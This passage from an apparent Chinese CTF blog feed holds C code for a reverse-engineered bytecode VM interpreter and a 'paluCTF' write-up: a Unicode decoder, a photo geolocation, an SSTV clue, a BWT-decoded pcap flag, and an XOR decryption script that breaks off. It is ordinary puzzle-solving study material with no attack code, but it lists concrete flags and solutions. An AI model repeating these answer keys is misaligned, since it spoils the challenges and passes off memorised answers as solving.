punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    c<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//printf("Memory[%x] = Memory[%x] / Memory[%x]",a*4,b*4,c*4);</span>    <span class="token keyword">return</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">rst_in</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//printf("in_pointer = 0"); </span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">rst_out</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//printf("out_pointer = 0");</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">pop_in</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//for(int i=0;i&lt;b;i++)</span>    <span class="token punctuation">&#123;</span>    <span class="token comment">//    printf("Memory[%x] = input[%x]\n",(a+i)*4,i);</span>    <span class="token comment">//    printf("in_pointer++\n");</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">pop_out</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    for(int i=0;i&lt;b;i++)</span>    <span class="token punctuation">&#123;</span>    <span class="token comment">//    printf("output[%x] = Memory[%x]\n",i,(a+i)*4);</span><span class="token comment">//        printf("in_pointer++\n");</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">read_buf</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    printf("input: %d",a);</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">write_buf</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    printf("output: output[]");</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">jmp</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//if(b&amp;&amp;)</span><span class="token comment">//    printf("if(%d) &amp;&amp; !Memory[%x] jmp %d\n",b,b*4,ep/4 + 2) ;</span><span class="token comment">//    printf("else jmp %d",ep/4 + a);</span>    <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">njmp</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//if(b&amp;&amp;)</span><span class="token comment">//    printf("if(%d) &amp;&amp; !Memory[%x] jmp %d\n",b,b*4,ep/4 + 2) ;</span><span class="token comment">//    printf("else jmp %d",ep/4 + a);</span>    <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">len</span><span class="token punctuation">(</span><span class="token keyword">int</span> ep<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">uint32_t</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>    a<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">uint32_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>opcode<span class="token punctuation">[</span>ep<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//if(b&amp;&amp;)</span><span class="token comment">//    printf("Memory[%x] = strlen(input)",b);</span>    <span class="token keyword">return</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> v1<span class="token punctuation">,</span>v2<span class="token punctuation">,</span>v3<span class="token punctuation">,</span>v4<span class="token punctuation">,</span>v5<span class="token punctuation">,</span>v6<span class="token punctuation">,</span>v7<span class="token punctuation">,</span>v8<span class="token punctuation">,</span>v9<span class="token punctuation">,</span>v10<span class="token punctuation">,</span>v11<span class="token punctuation">,</span>v12<span class="token punctuation">,</span>v13<span class="token punctuation">,</span>buf<span class="token punctuation">;</span>    <span class="token keyword">int</span> in_pointer<span class="token punctuation">;</span>    <span class="token keyword">int</span> ep<span class="token punctuation">,</span>op<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        ep<span class="token operator">=</span>opcode<span class="token punctuation">[</span>op<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ep<span class="token operator">==</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token comment">//printf("%04d: ",op/4);</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span> ep <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>        v1 <span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>        v2 <span class="token operator">=</span> <span class="token function">sub</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>        v3 <span class="token operator">=</span> <span class="token function">mul</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v3 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>        v4 <span class="token operator">=</span> <span class="token function">divide</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v4 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>        v5 <span class="token operator">=</span> <span class="token function">rst_in</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span>        v6 <span class="token operator">=</span> <span class="token function">rst_out</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v6 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">7</span><span class="token operator">:</span>        v7 <span class="token operator">=</span> <span class="token function">pop_in</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v7 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">8</span><span class="token operator">:</span>        v8 <span class="token operator">=</span> <span class="token function">pop_out</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v8 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">9</span><span class="token operator">:</span>        buf <span class="token operator">=</span> <span class="token function">read_buf</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>buf <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">0xA</span><span class="token operator">:</span>        v10 <span class="token operator">=</span> <span class="token function">write_buf</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v10 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">0xB</span><span class="token operator">:</span>        v11 <span class="token operator">=</span> <span class="token function">jmp</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v11 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">0xC</span><span class="token operator">:</span>        v12 <span class="token operator">=</span> <span class="token function">njmp</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v12 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">case</span> <span class="token number">0xD</span><span class="token operator">:</span>        v13 <span class="token operator">=</span> <span class="token function">len</span><span class="token punctuation">(</span>op <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        op <span class="token operator">+=</span> <span class="token punctuation">(</span>v13 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token keyword">default</span><span class="token operator">:</span>          op <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>         <span class="token comment">//exit(1);</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   <span class="token comment">// cout&lt;&lt;endl;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输入以后用z3解</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>paluCTF个人Wp</title>
      <link href="/2024/04/19/paluCTF%E4%B8%AA%E4%BA%BAWp/"/>
      <url>/2024/04/19/paluCTF%E4%B8%AA%E4%BA%BAWp/</url>
      
        <content type="html"><![CDATA[<h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id="签到"><a class="markdownIt-Anchor" href="#签到"></a> 签到</h2><p>​观察了一下，发现是unicode编码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">decode_unicode</span><span class="token punctuation">(</span>dec_list<span class="token punctuation">)</span><span class="token punctuation">:</span>    decoded_chars <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> dec <span class="token keyword">in</span> dec_list<span class="token punctuation">:</span>        decoded_chars<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>dec<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>decoded_chars<span class="token punctuation">)</span>unicode_decimals <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">27880</span><span class="token punctuation">,</span> <span class="token number">30693</span><span class="token punctuation">,</span> <span class="token number">25915</span><span class="token punctuation">,</span> <span class="token number">21892</span><span class="token punctuation">,</span> <span class="token number">38450</span><span class="token punctuation">,</span> <span class="token number">23454</span><span class="token punctuation">,</span> <span class="token number">39564</span><span class="token punctuation">,</span> <span class="token number">23460</span><span class="token punctuation">,</span> <span class="token number">21457</span><span class="token punctuation">,</span> <span class="token number">36865</span><span class="token punctuation">,</span>    <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">33719</span><span class="token punctuation">,</span> <span class="token number">21462</span><span class="token punctuation">,</span> <span class="token number">21069</span><span class="token punctuation">,</span> <span class="token number">27573</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span>    <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">20851</span><span class="token punctuation">,</span> <span class="token number">27880</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">23433</span><span class="token punctuation">,</span> <span class="token number">20840</span><span class="token punctuation">,</span> <span class="token number">22242</span><span class="token punctuation">,</span>    <span class="token number">38431</span><span class="token punctuation">,</span> <span class="token number">22238</span><span class="token punctuation">,</span> <span class="token number">22797</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">33719</span><span class="token punctuation">,</span> <span class="token number">21462</span><span class="token punctuation">,</span> <span class="token number">21518</span><span class="token punctuation">,</span>    <span class="token number">27573</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">]</span>decoded_text <span class="token operator">=</span> decode_unicode<span class="token punctuation">(</span>unicode_decimals<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>decoded_text<span class="token punctuation">)</span><span class="token comment">#注知攻善防实验室发送plbctf获取前段flag关注One-Fox安全团队回复plbctf获取后段flag</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>flag{TreJaiuLT1rgbdfG0Eay}</strong></p><h2 id="江"><a class="markdownIt-Anchor" href="#江"></a> 江</h2><p>6174</p><p><strong>提交格式：</strong> flag{xx省xx市xxx路与xx路xx街交叉路口}</p><p>逆天，我去过这里，，一眼江汉路我曹，属实难绷,注意到旁边有个新金珠宝，然后谷歌地图一搜</p><p>6315</p><p><strong>flag{湖北省武汉市江汉二路与江汉路步行街交叉路口}</strong></p><h2 id="fm1458"><a class="markdownIt-Anchor" href="#fm1458"></a> fm145.8</h2><p>老题了，rxsstv梭了</p><h2 id="什么协议"><a class="markdownIt-Anchor" href="#什么协议"></a> 什么协议?</h2><p>随便翻翻在http/json协议中找到了个假flag，盲猜真flag也在http/json协议，过滤网络流</p><p>6496</p><p>6553</p><p>一眼看出flag</p><p>然后百度发现是块排序压缩BWT解码:<strong>flag{go0d_finder_f0r_th1s}</strong></p><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id="login_system"><a class="markdownIt-Anchor" href="#login_system"></a> Login_System</h2><p>6700</p><p>进入验证成功的函数</p><p>6768</p><p>易得加密逻辑</p><p>简单xor</p><p>写解密脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">A<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span 